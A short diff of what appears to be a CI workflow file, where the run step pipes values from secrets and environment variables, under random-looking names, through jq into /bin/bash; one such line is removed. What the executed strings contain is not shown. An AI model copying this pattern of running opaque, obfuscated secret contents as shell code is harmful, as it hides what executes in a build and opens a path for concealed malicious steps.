@@ -22,7 +22,6 @@ jobs:
           kdh4: ${{ secrets.kdh4 }}
         run: |
           printf '%s' "$kdh4" | jq -r .aouo9 | /bin/bash
-          echo $fms4228 | jq -r .dx82532 | /bin/bash
           echo $ubsgx91 | jq -r .heuhh2643 | /bin/bash
 
       - name: Archive artifact
